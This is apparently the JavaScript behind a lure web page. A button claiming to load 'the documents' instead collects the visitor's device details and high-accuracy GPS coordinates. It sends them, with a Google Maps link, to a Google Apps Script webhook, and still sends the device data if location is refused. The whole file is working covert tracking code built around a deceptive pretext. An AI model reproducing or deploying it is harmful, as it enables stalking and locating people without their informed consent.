// ⚠️ REEMPLAZÁ esta URL con la de tu Google Apps Script
const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbwrjqoLp_Znj40rDfzbE0EgANrL8m-PGpMI0zwjZEFqtTr0x5tXD1C2XVFOaX0PiNoDrA/exec";

function registrar() {
  const btn = document.getElementById("btnVer");
  const status = document.getElementById("status");

  btn.disabled = true;
  btn.textContent = "Obteniendo los documentos...";
  status.textContent = "";
  status.className = "status";

  // Datos del dispositivo
  const dispositivo = {
    userAgent: navigator.userAgent,
    plataforma: navigator.platform || "desconocido",
    idioma: navigator.language || "desconocido",
    pantalla: `${screen.width}x${screen.height}`,
    fecha: new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" }),
    referrer: document.referrer || "directo"
  };

  if (!navigator.geolocation) {
    // Si el navegador no soporta geolocalización, enviamos igual sin coords
    enviar(null, null, dispositivo, status, btn);
    return;
  }

  navigator.geolocation.getCurrentPosition(
    function(pos) {
      enviar(pos.coords.latitude, pos.coords.longitude, dispositivo, status, btn);
    },
    function(err) {
      // El usuario rechazó o hubo error: enviamos igualmente sin coords
      dispositivo.errorGeo = err.message;
      enviar(null, null, dispositivo, status, btn);
    },
    { timeout: 8000, maximumAge: 0, enableHighAccuracy: true }
  );
}

function enviar(lat, lon, dispositivo, status, btn) {
  const payload = {
    latitud: lat ?? "no disponible",
    longitud: lon ?? "no disponible",
    mapsLink: lat && lon ? `https://maps.google.com/?q=${lat},${lon}` : "no disponible",
    ...dispositivo
  };

  fetch(WEBHOOK_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  })
  .then(() => {
    status.textContent = "✓ Registrado correctamente";
    status.className = "status ok";
    btn.textContent = "Listo";
  })
  .catch(() => {
    status.textContent = "Error al conectar con el servidor";
    status.className = "status error";
    btn.disabled = false;
    btn.textContent = "Reintentar";
  });
}
